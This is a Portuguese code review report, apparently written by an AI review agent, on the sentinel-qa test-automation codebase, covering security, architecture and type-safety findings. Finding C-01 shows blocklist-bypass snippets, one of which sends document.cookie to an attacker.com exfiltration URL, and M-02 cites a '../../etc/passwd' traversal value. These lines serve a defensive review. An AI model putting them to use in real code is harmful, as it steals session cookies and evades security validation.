# Code Review Report: Codebase completa do sentinel-qa

**Data**: 2026-03-31
**Revisor**: Senior Code Review Agent (nível Architect)
**Escopo**: packages/mcp-server, packages/playwright-runner, packages/maestro-bridge, registry/
**Commit**: e6ccbbe (HEAD, main)
**Objetivo**: checagem de qualidade focada nos módulos que serão mantidos, antes do refactor para standalone agent

---

## Resumo

Para um projeto em estágio inicial, o sentinel-qa tem uma arquitetura bem organizada. Os limites entre módulos são claros, existe validação de segurança do código de teste (`validator.ts`), e a cobertura de testes é suficiente nos módulos centrais. Ainda assim, existem issues que precisam ser resolvidos antes do refactor: **possibilidade de bypass da validação de segurança**, **problema de God Function em `run-tests.ts`**, **ausência de validação ao carregar YAML**, e **risco de race condition**.

| Severidade | Quantidade |
|--------|------|
| CRITICAL | 2 |
| HIGH | 5 |
| MEDIUM | 7 |
| LOW | 4 |
| INFO | 3 |

---

## Findings Críticos e de Alta Prioridade

### [C-01] Possibilidade de Bypass do Validator de Código de Teste (Security)
- **Severidade**: CRITICAL
- **Categoria**: Security
- **Arquivo**: `packages/playwright-runner/src/validator.ts:7-30`
- **Issue**: A blocklist baseada em regex pode ser facilmente contornada por ofuscação. Por exemplo:
  ```typescript
  // Bypass exemplo 1: concatenação de string
  const e = 'ev' + 'al';
  globalThis[e]('malicious code');

  // Bypass exemplo 2: execução de código arbitrário dentro do page.evaluate() do Playwright
  await page.evaluate(() => {
    // aqui é o contexto do navegador, então as restrições do Node.js não têm efeito
    fetch('https://attacker.com/exfil?data=' + document.cookie);
  });

  // Bypass exemplo 3: acesso indireto
  const p = process;
  p['ex' + 'it'](1);
  ```
- **Impacto**: se o código de teste gerado pelo pilot-ai for malicioso ou incorreto, é possível executar código arbitrário no sistema host
- **Recomendação**:
  ```typescript
  // Etapa 1: migrar para validação baseada em AST (usando a TypeScript compiler API)
  import ts from 'typescript';

  function validateWithAST(code: string): ValidationResult {
    const sourceFile = ts.createSourceFile('test.ts', code, ts.ScriptTarget.Latest, true);
    const errors: string[] = [];

    function visit(node: ts.Node) {
      // Verifica CallExpression — eval, Function, require etc.
      if (ts.isCallExpression(node)) {
        const name = node.expression.getText(sourceFile);
        if (BLOCKED_CALL_NAMES.has(name)) {
          errors.push(`${name}() is not allowed`);
        }
      }
      // Verifica ImportDeclaration
      if (ts.isImportDeclaration(node)) {
        const specifier = (node.moduleSpecifier as ts.StringLiteral).text;
        if (!ALLOWED_MODULES.has(specifier)) {
          errors.push(`Import of "${specifier}" is not allowed`);
        }
      }
      ts.forEachChild(node, visit);
    }
    visit(sourceFile);
    return { valid: errors.length === 0, errors };
  }

  // Etapa 2: (longo prazo) executar em um sandbox isolado (container Docker, VM)
  ```

### [C-02] Risco de Command Injection via appId no Maestro Bridge (Security)
- **Severidade**: CRITICAL
- **Categoria**: Security
- **Arquivo**: `packages/maestro-bridge/src/runner.ts:120-126`
- **Issue**: o valor de `appId` é passado como array de `args` do `spawn`, então não é shell injection propriamente dito, mas o `filePath` é construído a partir do `test.id` fornecido pelo usuário (linha 49). Se `test.id` contiver caracteres de manipulação de caminho como `../`, é possível escrever um arquivo fora do diretório temporário.
  ```typescript
  // runner.ts:49 — test.id usado como caminho de arquivo sem validação
  const filePath = join(tempDir, `${test.id}.yaml`);
  ```
- **Impacto**: path traversal permite escrever arquivos YAML em posições arbitrárias do sistema
- **Recomendação**:
  ```typescript
  import { basename } from 'node:path';

  // sanitizar o test.id antes de usá-lo como nome de arquivo
  function sanitizeId(id: string): string {
    // remove separadores de caminho, permite só alfanumérico/hífen/underscore
    return id.replace(/[^a-zA-Z0-9_-]/g, '_');
  }

  const safeId = sanitizeId(test.id);
  const filePath = join(tempDir, `${safeId}.yaml`);

  // confirma que o caminho resultante está dentro do tempDir
  if (!filePath.startsWith(tempDir)) {
    throw new Error(`Invalid test ID: path traversal detected`);
  }
  ```

### [H-01] God Function em run-tests.ts — função única de 260 linhas (Architecture)
- **Severidade**: HIGH
- **Categoria**: Architecture & Design
- **Arquivo**: `packages/mcp-server/src/tools/run-tests.ts:15-261`
- **Issue**: o callback interno de `registerRunTests` chega a 260 linhas e concentra todas estas responsabilidades:
  1. Filtro de quarantine
  2. Determinação de plataforma
  3. Filtro de testes por plataforma
  4. Execução do Playwright + processamento do resultado
  5. Execução do Maestro + conversão do resultado
  6. Validação de eventos
  7. Salvamento do relatório
  8. Montagem da resposta JSON
- **Impacto**: se esse código não for separado antes da migração para o standalone agent, a manutenção fica extremamente difícil. Já hoje há duplicação entre a lógica de web/flutter (o registro de status e o salvamento de relatório se repetem duas vezes).
- **Recomendação**:
  ```typescript
  // Separar por responsabilidade
  // 1. TestFilterService — filtro de quarantine e de plataforma
  // 2. TestOrchestrator — roteamento de plataforma + coordenação da execução
  // 3. ResultProcessor — registro de status, validação de eventos, salvamento do relatório

  class TestOrchestrator {
    constructor(
      private runners: Map<Platform, TestRunner>,
      private statusStore: TestStatusStore,
      private reportStore: ReportStore,
      private registry: AppRegistry,
    ) {}

    async execute(appId: string, tests: TestCase[], options: RunOptions): Promise<RunResponse> {
      const runner = this.runners.get(options.platform);
      if (!runner) throw new Error(`No runner for platform: ${options.platform}`);

      const result = await runner.run(tests);
      await this.recordResults(appId, result);
      // ...
    }
  }
  ```

### [H-02] Ausência de Validação em Tempo de Execução ao Carregar YAML (Type Safety)
- **Severidade**: HIGH
- **Categoria**: Type Safety / Security
- **Arquivo**: `packages/mcp-server/src/utils/yaml-loader.ts:4-7`
- **Issue**: a função `loadYaml<T>` só faz uma asserção de tipo `as T`, sem validação real em tempo de execução. Se o arquivo YAML não corresponder ao schema esperado, ocorre um erro de acesso a `undefined` em tempo de execução.
  ```typescript
  // Atual: asserção de tipo perigosa
  export async function loadYaml<T>(filePath: string): Promise<T> {
    const content = await readFile(filePath, 'utf-8');
    return parse(content) as T;  // sem validação de que realmente é T
  }
  ```
- **Impacto**: um YAML incorreto é carregado silenciosamente e gera erros crípticos no processamento seguinte
- **Recomendação**:
  ```typescript
  import { z, ZodSchema } from 'zod';

  export async function loadYaml<T>(filePath: string, schema: ZodSchema<T>): Promise<T> {
    const content = await readFile(filePath, 'utf-8');
    const raw = parse(content);
    return schema.parse(raw);  // validação em runtime + segurança de tipo
  }

  // Uso:
  const config = await loadYaml(appsPath, appsConfigSchema);
  ```
  Nota: `event-validation/schema.ts` já tem schemas Zod definidos, bastando integrá-los ao `loadYaml`.

### [H-03] Race Condition no TestStatusStore (Error Handling / Resilience)
- **Severidade**: HIGH
- **Categoria**: Error Handling & Resilience
- **Arquivo**: `packages/mcp-server/src/store/test-status-store.ts:54-97`
- **Issue**: `recordRun` usa o padrão load → modify → save. Se vários resultados de teste forem gravados simultaneamente, o último writer sobrescreve os resultados anteriores. Em `run-tests.ts:105-107` a execução hoje é sequencial (`await` em loop), mas isso se torna um problema imediato assim que houver paralelização.
  ```typescript
  // run-tests.ts:105-107 — sequencial hoje, mas arriscado
  for (const testResult of result.tests) {
    await statusStore.recordRun(app_id, testResult.id, testResult.status === 'passed');
    // lê e reescreve o arquivo inteiro a cada iteração — I/O O(n²)
  }
  ```
- **Impacto**: gravar N resultados de teste gera N leituras/escritas de arquivo (ineficiente). Em execução paralela, há perda de dados.
- **Recomendação**:
  ```typescript
  // 1. Adicionar um método de gravação em lote
  async recordBatch(appId: string, results: Array<{testId: string; passed: boolean}>): Promise<TestStatus[]> {
    const statuses = await this.load(appId);
    const updated: TestStatus[] = [];

    for (const { testId, passed } of results) {
      let entry = statuses.find((s) => s.id === testId);
      if (!entry) {
        entry = { id: testId, status: 'new', passRate: 0, runHistory: [], lastRun: '' };
        statuses.push(entry);
      }
      // ... lógica de atualização
      updated.push(entry);
    }

    await this.save(appId, statuses);  // escreve uma única vez
    return updated;
  }

  // 2. No longo prazo, migrar para file locking ou SQLite
  ```

### [H-04] Path Traversal via test.id no Playwright Runner (Security)
- **Severidade**: HIGH
- **Categoria**: Security
- **Arquivo**: `packages/playwright-runner/src/runner.ts:164-167`
- **Issue**: mesmo padrão do C-02. O nome do arquivo é gerado com base no índice, então hoje é seguro, mas o mapeamento `test-${i}.spec.ts` em `parseJsonReport` depende do `idMap`, então a consistência precisa ser mantida.
  ```typescript
  // Seguro hoje (usa índice)
  const fileName = `test-${i}.spec.ts`;
  ```
  Porém, se `test.id` passar a fazer parte do nome do arquivo no futuro, isso se torna vulnerável imediatamente.
- **Impacto**: seguro hoje, mas alto risco de erro em um refactor futuro
- **Recomendação**: adicionar uma função de sanitize por precaução e documentar o motivo

### [H-05] Event Validation Sempre Chamada com Array Vazio (Data Flow)
- **Severidade**: HIGH
- **Categoria**: Data Flow / Dead Code
- **Arquivo**: `packages/mcp-server/src/tools/run-tests.ts:121`
- **Issue**: a lógica de validação de eventos existe, mas `capturedEvents` está sempre vazio:
  ```typescript
  const capturedEvents: CapturedEvent[] = [];  // sempre vazio
  eventValidation = validateEvents(eventSpec.events, capturedEvents);
  // resultado: todo evento aparece sempre como 'missing'
  ```
  O comentário no código diz "will be fully integrated when the Playwright runner supports event capture", mas, no estado atual, chamar com `validate_events: true` faz o usuário receber um resultado incorreto.
- **Impacto**: o usuário não pode confiar no resultado da validação de eventos
- **Recomendação**: (A) retornar um aviso de "not yet implemented" quando `validate_events` for `true`, ou (B) implementar interceptação de rede no Playwright runner para capturar os eventos de verdade. Na migração para standalone agent, completar essa funcionalidade deve ser prioridade.

---

## Findings de Média e Baixa Prioridade

### [M-01] Inconsistência de Tipos entre Resultados do Playwright/Maestro (Type Safety)
- **Severidade**: MEDIUM
- **Categoria**: Type Safety
- **Arquivo**: `packages/mcp-server/src/tools/run-tests.ts:196-209`
- **Issue**: o resultado do Maestro é convertido manualmente para o tipo `RunResult` do Playwright, porque não existe uma interface comum entre os dois runners.
  ```typescript
  const runResult: RunResult = {
    passed: maestroResult.passed,
    failed: maestroResult.failed,
    skipped: 0,  // campo inexistente no Maestro, hardcoded
    timedOut: 0,
    // ...
    tests: maestroResult.tests.map((t) => ({
      // conversão de 'cancelled' → 'skipped'
      status: t.status === 'cancelled' ? 'skipped' as const : t.status,
    })),
  };
  ```
- **Recomendação**: extrair uma interface comum `TestRunResult` em um pacote separado, implementada por cada runner.
  ```typescript
  // packages/shared-types/src/index.ts
  export interface UnifiedRunResult {
    passed: number;
    failed: number;
    skipped: number;
    total: number;
    duration: number;
    tests: UnifiedTestResult[];
  }
  ```

### [M-02] Path Traversal não Validado no AppRegistry (Security)
- **Severidade**: MEDIUM
- **Categoria**: Security
- **Arquivo**: `packages/mcp-server/src/registry/registry.ts:39,52`
- **Issue**: `app.context.selectors` e `app.context.event_spec` são combinados via `resolve(this.registryDir, ...)`. Se o arquivo YAML tiver um valor como `../../etc/passwd`, é possível ler arquivos fora do registryDir.
- **Recomendação**:
  ```typescript
  const resolvedPath = resolve(this.registryDir, relativePath);
  if (!resolvedPath.startsWith(this.registryDir)) {
    throw new Error(`Path traversal detected: ${relativePath}`);
  }
  ```

### [M-03] Ausência de Logging Estruturado no Logger (Code Quality)
- **Severidade**: MEDIUM
- **Categoria**: Code Quality
- **Arquivo**: `packages/mcp-server/src/utils/logger.ts`
- **Issue**: passar spread arguments para `console.error` produz uma saída não estruturada, em vez de um log JSON estruturado. No standalone agent, pode ser necessário fazer parsing dos logs.
- **Recomendação**: aplicar um formato estruturado incluindo pelo menos timestamp e level
  ```typescript
  export const logger = {
    info: (...args: unknown[]) =>
      console.error(JSON.stringify({ level: 'info', ts: Date.now(), msg: args })),
    // ...
  };
  ```

### [M-04] Silenciamento de Erros em capture-patterns.ts (Error Handling)
- **Severidade**: MEDIUM
- **Categoria**: Error Handling
- **Arquivo**: `packages/mcp-server/src/event-validation/capture-patterns.ts:38,59,79,105`
- **Issue**: todos os parsers usam o padrão `catch { /* ignore parse errors */ }`. Quando o parsing falha, retorna um array vazio, então o usuário não é avisado quando eventos são perdidos.
- **Recomendação**: pelo menos registrar um log de debug, ou rastrear falhas de parsing em um contador separado

### [M-05] Resultado do JSON.parse não Validado em ReportStore.getLatest (Type Safety)
- **Severidade**: MEDIUM
- **Categoria**: Type Safety
- **Arquivo**: `packages/mcp-server/src/report/report-store.ts:79-80`
- **Issue**: o resultado de `JSON.parse(raw)` é retornado como `RunResult & { meta: ReportMeta }` sem validação. Se o arquivo estiver corrompido ou o schema tiver mudado, ocorre um erro em tempo de execução.
- **Recomendação**: validar o resultado do parsing com um schema Zod, ou pelo menos checar a existência dos campos obrigatórios

### [M-06] Execução Sequencial no Maestro Runner (Performance)
- **Severidade**: MEDIUM
- **Categoria**: Performance
- **Arquivo**: `packages/maestro-bridge/src/runner.ts:58-82`
- **Issue**: todos os testes do Maestro são executados sequencialmente. Testes independentes poderiam rodar em paralelo.
- **Recomendação**: adicionar uma opção `concurrency` para suportar execução paralela. Como a CLI do Maestro compartilha o dispositivo, é necessário gerenciar um pool de dispositivos.

### [M-07] TestStore é Apenas em Memória (Architecture)
- **Severidade**: MEDIUM
- **Categoria**: Architecture
- **Arquivo**: `packages/mcp-server/src/store/test-store.ts`
- **Issue**: `TestStore` é um `Map` puramente em memória. Ao reiniciar o processo, todos os testes salvos são perdidos. É inconsistente que `TestStatusStore` seja baseado em arquivo enquanto só o `TestStore` fica em memória.
- **Recomendação**: no standalone agent, considerar migrar `TestStore` também para arquivo ou SQLite

### [L-01] Parsing de Progress Impreciso no Playwright Runner (Code Quality)
- **Severidade**: LOW
- **Categoria**: Code Quality
- **Arquivo**: `packages/playwright-runner/src/runner.ts:260-275`
- **Issue**: existe uma lógica que busca o progress de trás para frente na string acumulada de stderr, mas `total` é sempre passado como `-1`.
  ```typescript
  options.onProgress(current, -1, progressLine.trim());  // total = -1 ???
  ```
- **Recomendação**: passar o total corretamente, ou tornar o campo opcional no tipo de progress

### [L-02] Variável startTime não Utilizada (Dead Code)
- **Severidade**: LOW
- **Categoria**: Code Quality
- **Arquivo**: `packages/maestro-bridge/src/parser.ts:19`
- **Issue**: `const startTime = Date.now();` é declarada mas nunca usada.
- **Recomendação**: remover

### [L-03] Uso Síncrono de existsSync no Registry (Performance)
- **Severidade**: LOW
- **Categoria**: Performance
- **Arquivo**: `packages/mcp-server/src/registry/registry.ts:17,40,50`, `packages/mcp-server/src/report/report-store.ts:59,74`
- **Issue**: `existsSync` é usado dentro de código assíncrono, bloqueando o event loop.
- **Recomendação**: substituir por `access(path, constants.F_OK)`, ou envolver `readFile` em try-catch tratando ENOENT (padrão já usado no TestStatusStore)

### [L-04] Matching por Substring Simples em matchAnalyticsUrl (Code Quality)
- **Severidade**: LOW
- **Categoria**: Code Quality
- **Arquivo**: `packages/mcp-server/src/event-validation/capture-patterns.ts:152-163`
- **Issue**: padrões glob são tratados como simples matching de substring. Se `google-analytics.com` aparecer em qualquer parte da URL, o match ocorre, gerando falsos positivos.
- **Recomendação**: usar as bibliotecas `micromatch` ou `picomatch` para matching de glob preciso, ou fazer parsing via `URL` e comparar pelo hostname

---

## Informativo

### [I-01] Documentação da Restrição do Zod 3.x
- **Categoria**: Project Compliance
- O CLAUDE.md declara "Zod 3.x — MCP SDK compatibility", mas o `package.json` só tem `"zod": "^3.24.4"`. É necessário confirmar a compatibilidade com o Zod 4 quando o MCP SDK for atualizado.

### [I-02] Script de Lint não Implementado
- **Categoria**: Code Quality
- Em todos os pacotes, o script de lint é apenas `echo "No lint yet"`. Recomenda-se adotar ESLint + regras estritas de TypeScript.

### [I-03] Considerar Branded Types para Segurança de Tipos
- **Categoria**: Type Safety
- Identificadores como `appId` e `testId` são todos do tipo `string`. Usar branded types evita, em tempo de compilação, o erro de passar um ID incorreto.
  ```typescript
  type AppId = string & { readonly __brand: 'AppId' };
  type TestId = string & { readonly __brand: 'TestId' };
  ```

---

## Observações Positivas

1. **Boa consciência de segurança**: existe um validator do Playwright e os padrões bloqueados são abrangentes. A regra de proibir `console.log` também é bem seguida.
2. **Boa qualidade de testes**: módulos centrais como event-validation, test-status-store, validator, parse-report e parser têm testes cobrindo diversos casos, incluindo boundary cases (arrays vazios, fluxos sem correspondência).
3. **Padrão de registro de tools do MCP é limpo**: cada tool está em um arquivo separado, com baixo acoplamento via dependency injection.
4. **Bom suporte a cancelamento**: o cancelamento via AbortSignal é suportado tanto no Playwright runner quanto no Maestro bridge.
5. **Sistema de quarantine do TestStatusStore é bem projetado**: a lógica de promoção/rebaixamento baseada em janela de 5 execuções é clara e bem testada.
6. **Regra ESM-only aplicada de forma consistente**: todos os imports usam extensão `.js`, e `"type": "module"` está configurado.

---

## Action Items Prioritários para a Migração ao Standalone Agent

Com base nos módulos que serão mantidos (event-validation, test-status-store, report/markdown, registry, core do playwright-runner, core do maestro-bridge):

### Obrigatório (antes do refactor)
- [ ] **[C-01]** reforçar o validator.ts com validação baseada em AST, ou pelo menos bloquear o padrão `globalThis[...]`
- [ ] **[C-02]** sanitizar o test.id no Maestro bridge para prevenir path traversal
- [ ] **[H-01]** extrair a lógica comum (registro de status, salvamento de relatório) de run-tests.ts para um serviço separado
- [ ] **[H-02]** integrar validação de schema Zod ao loadYaml
- [ ] **[H-03]** adicionar o método recordBatch ao TestStatusStore

### Recomendado (durante o refactor)
- [ ] **[H-05]** implementar a captura de eventos de verdade no Playwright runner, ou retornar aviso "not implemented"
- [ ] **[M-01]** definir uma interface comum TestRunResult
- [ ] **[M-02]** adicionar validação de path traversal no Registry
- [ ] **[M-07]** decidir a estratégia de persistência do TestStore
- [ ] **[I-02]** adotar configuração de ESLint

### Melhoria (depois do refactor)
- [ ] **[M-03]** aplicar logging estruturado
- [ ] **[M-04]** adicionar rastreamento de erro ao parser de analytics
- [ ] **[M-06]** suportar execução paralela no Maestro
- [ ] **[L-02]** remover a variável não usada em parser.ts

---

## Avaliação Geral da Saúde do Código

**Nota: B+**

A base arquitetural é sólida, existe consciência de segurança, e a lógica central tem bons testes. Os 2 issues críticos são de segurança e precisam ser corrigidos obrigatoriamente, e decompor o run-tests.ts é o principal desafio da migração para standalone agent. Resolvendo os action items desta review na ordem, é totalmente possível chegar a um projeto nota A.

---

*Gerado pelo Senior Code Review Agent em 2026-03-31*
